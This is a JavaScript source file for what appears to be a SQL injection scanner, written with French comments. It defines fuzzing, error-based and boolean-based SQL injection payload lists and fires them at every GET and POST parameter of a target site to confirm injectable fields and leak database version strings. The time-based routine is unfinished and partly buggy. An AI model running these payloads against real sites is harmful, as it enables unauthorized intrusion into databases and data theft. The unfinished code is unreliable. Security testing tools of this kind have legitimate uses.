import { Scanner } from './Scanner.js'
import { removeTrailingSlash, sendRequest } from './utils.js' 

export class Injecter {
    static fuzzingPayload = ["'", '"', "%5C", "')", '")', '";', "';"];
    static ErrorBasedPayload = [
        "' AND (SELECT 1 FROM (SELECT(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))))a)--",
        "' AND 1=CAST((SELECT version()) AS INT)--",
        "' AND 1=CONVERT(int,@@version)--",    
    ]

    static BooleanBasedPayload = [
        [
            "AND 1=1--",
            "AND 1=2--"
        ],
        [
            "' AND 1=1--",
            "' AND 1=2--"
        ],
         [
            '" AND 1=1--',
            '" AND 1=2--'
        ],
        [
            "%' AND 1=1 AND '%'='--",
            "%' AND 1=2 AND '%'='--"
        ]
    ]

    constructor (cible) {
        this.cible = cible;
        this.result = 
            {
                url : this.cible.url,
                parameter : "",
                method : this.cible.method,
                vulnerabilityType : "",
                confidence : "",
                score : 0,
                payloadSent : ""
            };
        this.baseline;
    }
    //---------------------------------------------------------------------------

    //Appeller par le scan
    async inject() {
        this.baseline = await this.getBaselineResponse();

        const resultOfFuzzingPayload = await this.injectFuzzingPayload();
        console.log(this.result);
        if (resultOfFuzzingPayload === "END") {
            return this.result;
        } else if (resultOfFuzzingPayload === "CONTINUE") {
            
            await this.injectErrorPayload();
            console.log(this.result);
            return this.result;
        } else if (resultOfFuzzingPayload === "COMPLEX CONTINUE") {
            const resultOfBooleanPayload = await this.injectBooleanPayload();
            if(resultOfBooleanPayload === "END") {
                return this.result;
            }
            else {
                return this.result;
            }
        }
        //SI NO VULNERABILITY OU SI 301 et 302 FAIRE LES INJECTIONS COMPLEXE
    }

//     Score Cumulé	Niveau de Confiance	Couleur	Signification
// 100+	CRITIQUE	Rouge 🔴	Erreur SQL explicite trouvée. Faille certaine.
// 80 - 99	ÉLEVÉ	Orange 🟠	Pas d'erreur texte, mais injection temporelle (SLEEP) réussie.
// 45 - 79	MOYEN	Jaune 🟡	Erreur HTTP 500 ou changement de contenu suspect (Boolean).
// 0 - 44	FAIBLE / AUCUN	Gris ⚪	Comportement normal du serveur.

    async injectFuzzingPayload() {
        for (const inject of Injecter.fuzzingPayload) {
            let injectedResults = await this.injectPayloadMultipleParams(inject);

            for (const injectedResult of injectedResults) {
                const scanResult = Scanner.scanFuzzingPayload(this.baseline, injectedResult.response);
                if (scanResult !== null) {
                    if (scanResult.type === "Error-based SQL Injection") {
                        this.changeResult(injectedResult.injectedParam, `Error SQL Injection : [${scanResult.evidence}], Database type : ${scanResult.database}`, "CONFIRMED", scanResult.addToScore, inject);
                        return "END";
                    } else if (scanResult.error === 500) {
                        this.changeResult(injectedResult.injectedParam, "Internal Server Error", "HIGH", scanResult.addToScore, inject);
                        return "CONTINUE";
                    } else if (scanResult.error === 403 || scanResult.error === 406 || scanResult.error === 400) {
                        this.changeResult(injectedResult.injectedParam, "Blocked By WAF", "-", scanResult.addToScore, inject);
                        return "END";
                    } else if (scanResult.error === 301 || scanResult.error === 302 || scanResult.error === 400) {
                        this.changeResult(injectedResult.injectedParam, "Redirection", "-", scanResult.addToScore, inject);
                        return "COMPLEX CONTINUE";
                    } 
                }
            }
        }

        return "COMPLEX CONTINUE";
    }

    async injectErrorPayload() {
        let payloads = this.changeErrorBasedPaylaods();
        for (const payload of payloads) {
            let injectedResult = await this.injectPayloadSimpleParam(payload, this.result.parameter);
            const scanResult = Scanner.checkSQLError(this.baseline, injectedResult.response);
            if (scanResult !== null) {
                this.changeResult(null, `Error SQL Injection : [${scanResult.evidence}], Database type : ${scanResult.database}`, "CONFIRMED", scanResult.addToScore, payload)
            }
        }
        await this.injectErrorBasedRescuePayload();
        return "END";
    }

    async injectErrorBasedRescuePayload(){
        let payload = this.result.payloadSent + "--";
        let rescueInjection = await this.injectPayloadSimpleParam(payload, this.result.parameter);
        if(rescueInjection.response.status === 200) {
            this.changeResult(null, "Error SQL Injection", "CONFIRMED", 100, (this.result.payloadSent += " AND THEN " + payload));
        }
    }

    changeErrorBasedPaylaods() {
        let payloads = [];
        for (const payload of Injecter.ErrorBasedPayload) {
            payloads.push(payload.replace("'", this.result.payloadSent));
        }
        return payloads;
    }

    //Injection complexe
    async injectBooleanPayload() {
        for (const [injection1, injection2] of Injecter.BooleanBasedPayload) {
            let responseTrue = await this.injectPayloadMultipleParams(injection1);
            let responseFalse = await this.injectPayloadMultipleParams(injection2);
            for (let i = 0; i < responseTrue.length; i++) {
                const scanResult = Scanner.scanBooleanPayload(responseTrue[i].response, responseFalse[i].response);
                if(scanResult) {
                    this.changeResult(responseTrue[i].injectedParam, "BOOLEAN-BASED INJECTION", "HIGH", 80, (injection1 + " AND " + injection2));
                    return "END";
                }
            }
        }
        return "TIMEBASED CONTINUE";
        
    }

    async injectTimeBasedPayload() {
        let startTime = performance.now();
        response = await this.injectPayloadMultipleParams("SLEEP(5)");
        let endTime = performance.now();
        const duration1 = endTime - startTime;
        
        startTime = performance.now();
        response = await this.injectPayloadMultipleParams("pg.sleep(5)");
        endTime = performance.now();
        const duration2 = endTime - startTime;
        
        //Check if it worked then
    }

    //---------------------------------------------

    //Recois une réponses classique sans sqli pour la baseline
    async getBaselineResponse() {
        const params = this.createParams();

        if (this.cible.source === "link") {
            let craftedUrlBaseline = "";
            for (const [param, value] of params) {
                craftedUrlBaseline = removeTrailingSlash(this.cible.url) +`?${param}=${value}`;
            }   
            return await sendRequest(craftedUrlBaseline);
        }
            return await sendRequest(this.cible.url);
    }

    createParams(){
        return this.cible.params.map(param => {
            if(param instanceof Object) {
                return [Object.keys(param)[0], Object.values(param)[0]];
            } else {
                return [param, "1"];
            }
        });
    }

    changeResult(param = null, vulnerabilityType = null, confidence = null, score = null, payloadSent = null){
        if (param !== null) this.result.parameter = param;
        if (vulnerabilityType !== null) this.result.vulnerabilityType = vulnerabilityType;
        if (confidence !== null) this.result.confidence = confidence;
        if (score !== null) this.result.score = score;
        if (payloadSent !== null) this.result.payloadSent = payloadSent;
    }

    async injectPayloadMultipleParams(payload) {
        if (this.cible.method === "POST") {
            return await this.injectPayloadsPOST(payload);
        }
        return await this.injectPayloadsGET(payload);
    }

    //Injection GET Basique, test tout les parametres
    async injectPayloadsGET(payload) {
        const params = this.createParams();
        let responses = [];

        for (const [paramToInject, _] of params) {
            const response = await this.injectPayloadsGETSimpleParam(payload, paramToInject, params);
            responses.push(response);
        }
        return responses;
    }

    //Créer une autre fonction qui permet de tester qu'un seul parametres
    async injectPayloadsPOST(payload) {
        let responses = [];
        for (const param of this.cible.params) {
            const response = await this.injectPayloadsPOSTSimpleParam(payload, param);
            responses.push(response);
        }
        return responses;
    }

    async injectPayloadSimpleParam(payload, paramToInject) {
        if (this.cible.method === "POST") {
            return await this.injectPayloadsPOSTSimpleParam(payload, paramToInject);
        }
        return await this.injectPayloadsGETSimpleParam(payload, paramToInject, this.createParams());
    }

    //Injection GET Basique, test qu'une seul parametre
    async injectPayloadsGETSimpleParam(payload, paramToInject, params) {
        let craftedUrl = removeTrailingSlash(this.cible.url) + "?";
        for(const [param, value] of params) {
            if (param === paramToInject) {
                craftedUrl += `${param}=${payload}&`;
            }
            else {
                craftedUrl += `${param}=${value}&`
            }
            craftedUrl = craftedUrl.slice(0, -1);
        }

        console.log(`Injecting payload into (GET): ${craftedUrl}`);
        const response = await sendRequest(craftedUrl);
        return {
            injectedParam : paramToInject,
            response
        };
    }

    //Enlever les cibles et url ici, utiliser this 
    async injectPayloadsPOSTSimpleParam(payload, paramToInject) {
        let postData = {};
        for (const param of this.cible.params) {

            //pour les tokens csrf
            if (param instanceof Object && param === paramToInject) {
                const key = Object.keys(param)[0];
                postData[key] = `${Object.values(param)[0]}`;
            } else if (param === paramToInject) {
                postData[param] = payload;
            } else {
                postData[param] = "test";
            }
        }

        console.log(`Injecting payload into form (POST): ${this.cible.url}`);
        const response = await sendRequest(this.cible.url, "POST", postData);
        return {
            injectedParam : paramToInject,
            response
        };
    }
}